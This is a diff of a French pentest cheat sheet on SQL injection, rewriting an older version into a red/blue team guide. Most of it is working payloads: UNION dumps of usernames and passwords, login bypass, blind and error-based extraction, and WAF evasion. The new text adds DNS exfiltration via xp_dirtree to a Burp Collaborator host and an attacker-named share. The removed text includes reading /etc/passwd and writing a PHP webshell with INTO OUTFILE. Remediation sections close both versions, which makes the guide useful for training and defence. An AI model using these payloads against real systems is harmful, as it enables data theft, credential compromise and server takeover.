@@ -1,201 +1,413 @@
-# Injections SQL — théorie et exploitation
+---
+title: "Injections SQL (SQLi) : Détection, Exploitation et Prévention"
+description: "Guide complet sur les injections SQL : détection In-Band/Inline/Blind/OAST, attaques UNION, exfiltration, WAF bypass, fingerprinting et remédiation par requêtes préparées et listes blanches."
+tags:
+  - sqli
+  - web-security
+  - red-team
+  - blue-team
+  - database
+  - vulnerability
+  - remediation
+---
 
-Cheat sheet sur la détection, l'exploitation manuelle et la remédiation des injections SQL (SQLi).
+# Injections SQL (SQLi) : Détection, Exploitation et Prévention
 
-!!! warning "Cadre légal"
-    Ces techniques ne doivent être mises en œuvre que dans un cadre légal explicite : laboratoire, CTF, ou test d'intrusion couvert par une autorisation écrite.
+!!! note "Objectif de la fiche"
+    Ce document couvre l'ensemble du cycle de vie d'une injection SQL : de la détection initiale (in-band, inline, blind, OAST) jusqu'à l'exploitation avancée (UNION, second-order, error-based) et la remédiation applicative. L'approche est volontairement équilibrée entre la posture offensive (Red Team) et la posture défensive (Blue Team).
 
 ---
 
-## Méthodologie de détection & fuzzing
+## 1. Détection des Vulnérabilités SQLi
 
-### Identification des points d'injection
+### 1.1 In-Band (Basé sur les erreurs et anomalies)
 
-Le fuzzing consiste à injecter des caractères susceptibles de casser la syntaxe SQL attendue par l'application.
+L'injection du caractère `'` (apostrophe) est le test le plus élémentaire pour casser la syntaxe d'une requête non préparée.
 
-```bash
-' ; -- casse une chaîne mal échappée
-" ; -- variante avec guillemets doubles (ODBC, certains ORM)
-) ; -- casse une clause encapsulée entre parenthèses
-; -- teste l'empilement de requêtes (stacked queries)
+```sql
+-- Requête légitime côté serveur
+SELECT * FROM produits WHERE nom = 'ENTREE';
+
+-- Après injection d'une simple apostrophe dans le paramètre
+-- ENTREE devient : '
+SELECT * FROM produits WHERE nom = '''';
 ```
 
-| Caractère | Contexte typique | Effet recherché |
-|---|---|---|
-| `'` | Chaîne de caractères SQL standard | Erreur de syntaxe si non échappé |
-| `"` | Identifiants MySQL, requêtes ODBC | Comportement différent selon le SGBD |
-| `)` | Paramètre encapsulé (`WHERE id=(1)`) | Déséquilibre de parenthèses |
-| `;` | Séparateur d'instructions | Test d'empilement de requêtes |
-| `--` / `#` | Commentaire SQL | Neutralise la fin de la requête originale |
+!!! danger "Signaux de détection"
+    - Messages d'erreur verbeux renvoyés par le SGBD, par exemple :
+        - `Unclosed quotation mark after the character string...` (SQL Server)
+        - `You have an error in your SQL syntax...` (MySQL/MariaDB)
+    - Code de statut HTTP anormal : `HTTP 500 Internal Server Error` au lieu du `HTTP 200 OK` attendu.
+    - Anomalies comportementales côté rendu : page blanche, éléments manquants, sections tronquées.
 
-!!! tip "Observer les variations de comportement"
-    Comparez systématiquement la réponse pour une valeur légitime, une valeur invalide et une valeur injectée : un changement de taille de réponse, de code HTTP ou de temps de traitement peut trahir une injection silencieuse.
+### 1.2 Inline (Évaluation d'expressions / calculs serveur)
 
-### Diagnostic par messages d'erreur verbeux
+Sur les entrées strictement numériques, il est possible de confirmer une injection sans casser la syntaxe, en observant si le serveur évalue une expression mathématique.
 
-| SGBD | Message d'erreur caractéristique |
+```text
+Paramètre d'origine : id=1
+
+Test 1 (résultat attendu = 1) : id=2-1
+Test 2 (résultat attendu = 1) : id=1-0
+Test 3 (résultat attendu = 2) : id=1+1
+```
+
+!!! tip "Méthode de confirmation"
+    Si le rendu visuel change strictement en fonction de l'expression injectée (par exemple l'enregistrement n°2 s'affiche au lieu du n°1), cela confirme que le paramètre est directement évalué par le SGBD, donc vulnérable.
+
+### 1.3 Boolean-Based Blind SQLi (Conditions booléennes)
+
+Technique utilisée lorsque l'application ne renvoie ni erreur SQL ni changement de code de statut, mais que le contenu de la réponse diffère selon la véracité d'une condition injectée.
+
+```sql
+-- Test d'une condition VRAIE
+' OR 1=1 --
+
+-- Test d'une condition FAUSSE
+' OR 1=2 --
+```
+
+!!! warning "Points d'observation"
+    - Présence ou absence d'un texte caractéristique (ex : `"Welcome Back"`).
+    - Différence de taille de la réponse HTTP en octets.
+    - Présence ou absence d'une redirection.
+
+    La comparaison systématique entre une condition VRAIE et une condition FAUSSE est indispensable pour éliminer les faux positifs.
+
+### 1.4 Time-Based SQLi (Délais de réponse)
+
+Exploitable lorsque le rendu HTML et le code de statut restent strictement identiques quelle que soit la condition testée. On exploite alors un canal temporel.
+
+```sql
+-- MySQL / MariaDB
+' AND SLEEP(5) --
+
+-- PostgreSQL
+' AND pg_sleep(5) --
+
+-- SQL Server (MSSQL)
+' WAITFOR DELAY '0:0:5' --
+```
+
+!!! tip "Confirmation"
+    Une injection Time-Based est confirmée lorsque le délai de réponse mesuré augmente de manière cohérente avec la valeur injectée (ex : +5 secondes), de façon reproductible sur plusieurs requêtes.
+
+### 1.5 Out-of-Band / OAST (Out-of-band Application Security Testing)
+
+Technique réservée aux contextes où ni le canal de réponse ni le canal temporel ne sont exploitables (architectures asynchrones, API totalement aveugles, traitements par batch). Elle repose sur le déclenchement d'une requête réseau sortante (DNS, HTTP, SMB) vers un serveur d'écoute contrôlé par l'auditeur (type Burp Collaborator).
+
+```sql
+-- Oracle (fonctions réseau)
+UTL_HTTP
+DBMS_LDAP
+
+-- SQL Server (MSSQL) — requête réseau sortante via xp_dirtree
+exec master..xp_dirtree '\\serveur-attaquant.com\partage'
+```
+
+!!! danger "Confirmation OAST"
+    La vulnérabilité est confirmée par la réception effective d'une requête DNS ou HTTP entrante sur le serveur d'écoute, émise depuis l'adresse IP du SGBD cible — preuve irréfutable d'exécution du code SQL injecté côté serveur.
+
+---
+
+## 2. Emplacements, Contextes d'Injection et Contournement
+
+### 2.1 Emplacements dans les requêtes SQL
+
+| Type de requête | Emplacement typique |
 |---|---|
-| MySQL / MariaDB | `You have an error in your SQL syntax; check the manual...` |
-| PostgreSQL | `ERROR: unterminated quoted string at or near...` |
-| MSSQL | `Unclosed quotation mark after the character string...` |
-| Oracle | `ORA-00933: SQL command not properly ended` |
+| `SELECT` | Clause `WHERE` |
+| `UPDATE` | Clause `SET` / `WHERE` |
+| `INSERT` | Valeurs insérées |
+| `SELECT` (structure) | Noms de tables, noms de colonnes, clause `ORDER BY` |
 
-!!! tip "Fingerprinting via l'erreur"
-    Le format même du message (`ORA-xxxxx`, `ERROR:`, mention de "manual") permet souvent d'identifier le moteur SQL sans documentation, avant même d'avoir extrait la moindre donnée.
+### 2.2 Contournement de WAF (WAF Bypass) via encodage
+
+!!! warning "Techniques d'évasion"
+    Les WAF filtrant sur des motifs textuels bruts (`SELECT`, `UNION`, etc.) peuvent être contournés si la couche applicative décode les données **après** le filtrage.
+
+**Encodage XML / entités hexadécimales :**
+
+```xml
+<!-- Décodage XML effectué après le passage du WAF, avant exécution SQL -->
+<storeId>999 &#x53;ELECT ...</storeId>
+```
+
+**Encodage Unicode JSON :**
+
+```json
+{
+  "storeId": "999 \u0053ELECT * FROM information_schema.tables"
+}
+```
+
+### 2.3 En-têtes HTTP enregistrés en base de données
+
+Certaines applications journalisent ou persistent des en-têtes HTTP sans les paramétrer, ouvrant un vecteur d'injection souvent négligé lors des audits classiques.
+
+```http
+User-Agent: ' OR 1=1; --
+Referer: ' OR 1=1; --
+X-Forwarded-For: ' OR 1=1; --
+```
 
 ---
 
-## Typologies d'attaques & payloads manuels
+## 3. Techniques d'Attaque et Cas d'Usage
 
-### In-Band / Error-Based
-
-Exploite les messages d'erreur du SGBD pour faire fuiter des données directement dans la réponse applicative.
+### 3.1 Exfiltration de données cachées
 
 ```sql
-' AND extractvalue(1, concat(0x7e, (SELECT database()))) -- -
--- Force une erreur XPath contenant le nom de la base (MySQL)
+-- Neutralisation de la logique métier via commentaire
+Gifts'--
 
-' AND updatexml(1, concat(0x7e, (SELECT user())), 1) -- -
--- Variante avec updatexml, technique équivalente sur MySQL
+-- Neutralisation par tautologie
+Gifts' OR 1=1--
 ```
 
-### UNION-Based
+!!! danger "Avertissement de sécurité"
+    Si le même paramètre est réinjecté dans une clause `DELETE`, le risque devient une **destruction massive de données** :
 
-Combine le résultat d'une requête injectée avec celui de la requête légitime, via l'opérateur `UNION`.
+    ```sql
+    DELETE FROM products WHERE category = 'Gifts' OR 1=1--
+    ```
+
+    Cette requête supprime l'intégralité de la table `products`, et non uniquement la catégorie ciblée.
+
+### 3.2 Subversion de la logique applicative (Bypass d'authentification)
 
 ```sql
-' ORDER BY 1-- -              -- Incrémente jusqu'à erreur pour trouver le nombre de colonnes
-' ORDER BY 5-- -              -- Erreur ici indique 4 colonnes maximum
-' UNION SELECT NULL,NULL,NULL,NULL-- -   -- Confirme le nombre de colonnes
-' UNION SELECT 1,2,username,password FROM users-- -   -- Exfiltration réelle
+-- Neutralisation du contrôle du mot de passe
+administrator'--
 ```
 
-!!! tip "Équilibrage des colonnes"
-    Le nombre de colonnes du `UNION SELECT` doit correspondre exactement à celui de la requête d'origine, avec des types compatibles colonne par colonne. `NULL` sert souvent de joker universel lors du calibrage.
+!!! note "Variantes selon le SGBD"
+    - **MySQL** : un espace est requis après le commentaire double-tiret : `administrator'-- ` (espace final obligatoire).
+    - Alternative avec `#` (spécifique MySQL) : `administrator'#`.
 
-### Boolean-Based Blind
-
-Utilisée quand aucune donnée ni erreur n'est directement affichée : seule la différence de comportement (page identique vs différente) sert de canal d'exfiltration.
+**Ciblage du compte admin sans connaître son nom :**
 
 ```sql
-' AND 1=1-- -      -- Condition vraie : comportement normal
-' AND 1=2-- -      -- Condition fausse : comportement différent (référence)
+-- MySQL / PostgreSQL
+' OR 1=1 LIMIT 1--
+
+-- MSSQL / Oracle
+' OR 1=1--
 ```
+
+### 3.3 Attaques basées sur UNION (UNION-Based SQLi)
+
+!!! note "Prérequis"
+    - Le nombre de colonnes de la requête `UNION SELECT` doit être **identique** à celui de la requête d'origine.
+    - Les types de données de chaque colonne doivent être compatibles entre les deux requêtes.
+
+**Étape 1 — Énumération du nombre de colonnes :**
 
 ```sql
-' AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a'-- -
--- Teste le premier caractère du mot de passe, à répéter sur chaque position/caractère
+-- Via ORDER BY (recherche dichotomique jusqu'à erreur)
+' ORDER BY 3--
+
+-- Via UNION SELECT NULL (incrémentation progressive)
+' UNION SELECT NULL,NULL--
 ```
 
-!!! tip "Déduction caractère par caractère"
-    Technique lente manuellement mais parfaitement adaptée à l'automatisation via un script ou `sqlmap`, qui optimise la recherche par dichotomie sur les codes ASCII.
+!!! tip "Spécificité Oracle"
+    Oracle impose la clause `FROM DUAL` pour toute requête `SELECT` sans table source :
+    ```sql
+    ' UNION SELECT NULL,NULL FROM DUAL--
+    ```
 
-### Time-Based Blind
+**Étape 2 — Identification des colonnes de type `String/Char` :**
 
-Utilisée lorsque même la différence de comportement n'est pas observable : on infère la véracité d'une condition via un délai de réponse mesurable.
+```sql
+-- Substitution sélective de NULL par une valeur texte
+' UNION SELECT 'a',NULL--
+' UNION SELECT NULL,'a'--
+```
 
-| SGBD | Payload |
+**Étape 3 — Exfiltration :**
+
+```sql
+-- Exfiltration multi-colonnes
+' UNION SELECT username, password FROM users--
+
+-- Exfiltration mono-colonne avec séparateur (concaténation)
+' UNION SELECT username || ':' || password FROM users--   -- Oracle/PostgreSQL
+' UNION SELECT CONCAT(username,':',password) FROM users-- -- MySQL
+```
+
+---
+
+## 4. Techniques d'Exploitation Aveugles (Blind SQLi & Advanced)
+
+### 4.1 Réponses conditionnelles (Boolean-Based)
+
+Le vecteur d'injection n'est pas toujours un paramètre GET/POST visible : les cookies applicatifs sont fréquemment concernés.
+
+```http
+Cookie: TrackingId=xyz' AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a
+```
+
+L'extraction se fait **caractère par caractère**, via `SUBSTRING()` combiné à une recherche dichotomique sur l'espace de caractères possibles.
+
+!!! tip "Automatisation"
+    - **Burp Intruder** : modes Cluster Bomb (plusieurs positions) ou Pitchfork (positions synchronisées) pour automatiser le brute-force caractère par caractère.
+    - **sqlmap** :
+    ```bash
+    sqlmap -u "https://site.com" --cookie="TrackingId=xyz" -p TrackingId --level=2 --dump
+    ```
+
+### 4.2 Erreurs SQL conditionnelles
+
+Provoquer une erreur SQL (par exemple une division par zéro) **uniquement** lorsque la condition testée est vraie, afin de transformer un Blind SQLi en signal binaire exploitable via le code de statut HTTP.
+
+```sql
+xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a
+```
+
+Si la condition `(1=1)` est vraie, l'expression `1/0` déclenche une erreur SQL et donc un `HTTP 500` ; sinon, la requête s'exécute normalement.
+
+### 4.3 Error-Based SQLi
+
+Forcer une conversion de type incompatible (`CAST`) pour faire fuiter une donnée sensible directement dans le message d'erreur retourné par le SGBD.
+
+```sql
+' AND CAST((SELECT Password FROM Users WHERE Username='Administrator') AS int)=1--
+```
+
+Le SGBD tentera de convertir la chaîne (le mot de passe) en entier, échouera, et retournera généralement la valeur litigieuse dans le message d'erreur.
+
+### 4.4 Exploitation par délais temporels (Time-Based, rappel avancé)
+
+```sql
+WAITFOR DELAY '0:0:5'          -- SQL Server
+pg_sleep(5)                     -- PostgreSQL
+SLEEP(5)                        -- MySQL / MariaDB
+dbms_pipe.receive_message(('a'),5) -- Oracle
+```
+
+### 4.5 Exploitation Out-Of-Band / OAST — Exfiltration DNS
+
+La donnée exfiltrée est concaténée directement dans le nom de sous-domaine interrogé, permettant sa réception en clair sur le serveur d'écoute DNS.
+
+```sql
+-- SQL Server (MSSQL)
+'; declare @p varchar(1024);
+set @p=(SELECT password FROM users WHERE username='Administrator');
+exec('master..xp_dirtree "//'+@p+'.IDENTIFIANT.burpcollaborator.net/a"')--
+```
+
+!!! danger "Portée de l'impact"
+    Cette technique fonctionne même sur des architectures totalement aveugles (pas de réponse visible, pas de canal temporel exploitable), ce qui en fait l'une des techniques les plus puissantes en contexte d'audit avancé.
+
+---
+
+## 5. Empreinte et Énumération (Fingerprinting & Enumeration)
+
+### 5.1 Fingerprinting du SGBD
+
+| Critère | MySQL / MariaDB | PostgreSQL | SQL Server | Oracle |
+|---|---|---|---|---|
+| Commentaire | `#` ou `-- ` | `--` | `--` | `--` |
+| Concaténation | `CONCAT()` | `\|\|` | `+` | `\|\|` |
+| Table de métadonnées | `information_schema.tables` | `information_schema.tables` | `information_schema.tables` | `all_tables` |
+| Version | `version()` | `version()` | `@@version` | `v$version` |
+
+```sql
+-- Extraction de version selon le SGBD
+SELECT @@version;      -- SQL Server
+SELECT version();       -- MySQL / PostgreSQL
+SELECT * FROM v$version; -- Oracle
+```
+
+### 5.2 Énumération de la base de données
+
+**Étapes standard (via `information_schema`) :**
+
+```sql
+-- 1. Lister les tables
+' UNION SELECT table_name, NULL FROM information_schema.tables--
+
+-- 2. Lister les colonnes d'une table cible
+' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users'--
+
+-- 3. Exfiltrer les données
+' UNION SELECT username, password FROM users--
+```
+
+!!! note "Spécificités Oracle"
+    Oracle n'utilise pas `information_schema` mais ses propres vues de métadonnées : `all_tables`, `all_tab_columns`. Les noms d'objets y sont généralement stockés et retournés en **MAJUSCULES**.
+
+---
+
+## 6. SQLi de Second Ordre (Second-Order SQLi)
+
+!!! warning "Principe"
+    Contrairement à une injection classique exploitée immédiatement, le SQLi de second ordre exploite un décalage temporel entre le stockage d'une donnée malveillante et sa réutilisation non sécurisée dans une requête ultérieure.
+
+**Phase 1 — Stockage passif :**
+
+Une donnée malveillante (ex : `admin'--`) est soumise via un formulaire (inscription, changement de nom d'utilisateur, etc.) et **correctement échappée/paramétrée** au moment de l'enregistrement initial. Aucune exploitation n'est visible à ce stade.
+
+**Phase 2 — Exécution active :**
+
+Cette même donnée est **réutilisée ultérieurement** par une fonctionnalité différente, dans une requête construite dynamiquement sans paramétrage :
+
+```sql
+-- Exemple : une fonctionnalité de changement de mot de passe
+-- réutilise le nom d'utilisateur stocké sans le reparamétrer
+UPDATE users SET password = 'hacked123' WHERE username = 'administrator'--'
+```
+
+!!! danger "Difficulté de détection"
+    Ce type de vulnérabilité échappe aux scanners automatisés classiques, car le point d'injection (formulaire A) et le point d'exécution (fonctionnalité B) sont dissociés dans le temps et dans le code.
+
+---
+
+## 7. Prévention & Remédiation (Blue Team)
+
+### 7.1 Requêtes préparées / Paramétrage (Prepared Statements)
+
+!!! tip "Bonne pratique de référence"
+    La séparation stricte entre le code SQL et les données utilisateur, via des espaces réservés (placeholders), est la contre-mesure la plus robuste et la plus universellement recommandée (OWASP).
+
+```sql
+-- Requête préparée (exemple générique)
+SELECT * FROM produits WHERE nom = ?;
+```
+
+Dans ce modèle, la donnée injectée par l'utilisateur ne peut **jamais** être interprétée comme du code SQL, quelle que soit sa valeur.
+
+### 7.2 Gestion des structures dynamiques non paramétrables
+
+!!! warning "Limite des requêtes préparées"
+    Les espaces réservés (`?`) ne peuvent pas être utilisés pour :
+    - les noms de tables,
+    - les noms de colonnes,
+    - la direction de tri dans une clause `ORDER BY` (`ASC` / `DESC`).
+
+**Solution recommandée — Liste blanche applicative (Whitelisting) :**
+
+- Définir côté serveur une correspondance stricte entre les identifiants exposés côté client et les structures réelles de la base de données.
+- Rejeter toute valeur ne figurant pas explicitement dans cette liste blanche, sans jamais construire dynamiquement la requête à partir de l'entrée brute.
+
+```text
+Exemple de cartographie sécurisée :
+  Entrée utilisateur "date" -> colonne réelle "created_at"
+  Entrée utilisateur "prix" -> colonne réelle "price_cents"
+  Toute autre valeur -> rejet (HTTP 400)
+```
+
+### 7.3 Synthèse des contre-mesures
+
+| Contre-mesure | Portée |
 |---|---|
-| MySQL / MariaDB | `' AND IF(1=1, SLEEP(5), 0)-- -` |
-| PostgreSQL | `' AND (SELECT pg_sleep(5))-- -` |
-| MSSQL | `'; IF (1=1) WAITFOR DELAY '0:0:5'-- -` |
-| Oracle | `' AND (SELECT CASE WHEN (1=1) THEN dbms_lock.sleep(5) ELSE 1 END FROM dual)-- -` |
+| Requêtes préparées / ORM paramétré | Toutes les valeurs de données |
+| Liste blanche (whitelisting) | Identifiants, noms de colonnes/tables, tri |
+| Principe du moindre privilège (compte BDD applicatif) | Limitation de l'impact en cas de contournement |
+| Validation stricte des types d'entrée | Défense en profondeur |
+| WAF à jour + normalisation avant filtrage | Défense en profondeur (non suffisante seule) |
+| Journalisation et alerting sur erreurs SQL anormales | Détection précoce |
 
-!!! warning "Faux positifs réseau"
-    Un délai observé peut aussi provenir de la latence réseau ou d'une charge serveur ponctuelle. Répétez le test avec une condition fausse (délai attendu nul) pour confirmer l'interprétation par le SGBD.
-
----
-
-## Bypass de filtres & obscurcissement (WAF Bypass)
-
-### Encodage hexadécimal des chaînes
-
-Permet d'éviter les guillemets, souvent filtrés en priorité par les WAF basiques.
-
-```sql
-SELECT * FROM users WHERE username = 0x61646d696e
--- Équivalent de WHERE username = 'admin', sans utiliser de guillemets
-```
-
-### Espaces alternatifs (whitespace bypass)
-
-| Technique | Exemple |
-|---|---|
-| Commentaire inline | `UNION/**/SELECT/**/1,2,3` |
-| Encodage URL (saut de ligne) | `UNION%0aSELECT%0a1,2,3` |
-| Encodage URL (tabulation) | `UNION%09SELECT%091,2,3` |
-| Parenthèses (sans espace) | `UNION(SELECT(1),2,3)` |
-
-### Concaténation de fonctions
-
-```sql
-' UNION SELECT CONCAT(username,0x3a,password) FROM users-- -
--- Concatène deux colonnes avec ':' encodé en hexadécimal
-
-' UNION SELECT CHAR(97,100,109,105,110)-- -
--- Reconstruit 'admin' via ses codes ASCII
-```
-
-!!! tip "Combiner les techniques"
-    Un WAF filtrant `UNION SELECT` en clair peut souvent être contourné en combinant plusieurs techniques : commentaires inline, encodage hexadécimal, variation de casse (`UnIoN sElEcT`).
-
----
-
-## Escalade & impacts réels
-
-### Interrogation des métadonnées système
-
-`information_schema` (MySQL, PostgreSQL, MSSQL) et les vues `sys.*` (MSSQL) exposent la structure complète de la base sans connaissance préalable du schéma.
-```sql
-' UNION SELECT table_name,NULL FROM information_schema.tables-- -
--- Liste l'ensemble des tables accessibles
-
-' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'-- -
--- Liste les colonnes de la table 'users'
-
-' UNION SELECT name,NULL FROM sys.tables-- -
--- Équivalent MSSQL pour lister les tables
-```
-
-### Lecture et écriture de fichiers locaux
-
-!!! warning "Impact système critique"
-    Ces primitives dépassent le périmètre de la base et peuvent conduire à une compromission complète du serveur applicatif, notamment via le dépôt d'un webshell.
-
-```sql
-' UNION SELECT LOAD_FILE('/etc/passwd'),NULL-- -
--- Lecture d'un fichier local (nécessite le privilège FILE sous MySQL)
-
-' UNION SELECT '<?php system($_GET["cmd"]); ?>',NULL INTO OUTFILE '/var/www/html/shell.php'-- -
--- Écriture d'un webshell PHP, si le chemin est accessible en écriture par le SGBD
-```
-
----
-
-## Remédiation
-
-!!! warning "La whitelist de caractères ne suffit pas"
-    Filtrer ou échapper des caractères spécifiques (`'`, `--`, `;`) reste une défense fragile, contournable comme démontré ci-dessus. La seule protection efficace repose sur la séparation stricte entre code et données.
-
-| Mesure | Principe |
-|---|---|
-| **Requêtes préparées (Prepared Statements)** | Les paramètres sont transmis séparément de la requête SQL, jamais concaténés dans la chaîne |
-| **ORM (Object-Relational Mapping)** | Génère des requêtes paramétrées par construction, réduisant le risque d'erreur humaine |
-| **Principe du moindre privilège** | Le compte SGBD applicatif ne doit pas disposer des droits `FILE`, `DROP` ou d'accès à `information_schema` si non nécessaire |
-| **WAF** | Mesure de défense en profondeur complémentaire, jamais suffisante seule |
-
-```sql
--- Vulnérable : concaténation directe de l'entrée utilisateur
-SELECT * FROM users WHERE username = '" + input + "'
-
--- Sécurisé : requête préparée, paramètre lié
-SELECT * FROM users WHERE username = ?
-```
-
----
-
-## Voir aussi
-
-- OWASP Testing Guide — chapitre injection SQL
-- Documentation `sqlmap` pour l'automatisation de la détection et l'exploitation
-- Fiche complémentaire : `wireshark.md` pour observer le trafic généré par une exploitation
+!!! danger "Rappel essentiel"
+    Aucune de ces contre-mesures n'est suffisante isolément. Les requêtes préparées traitent la cause racine pour les données, mais doivent être complétées par du whitelisting pour les éléments structurels et par une défense en profondeur (moindre privilège, monitoring) pour limiter l'impact en cas de régression.
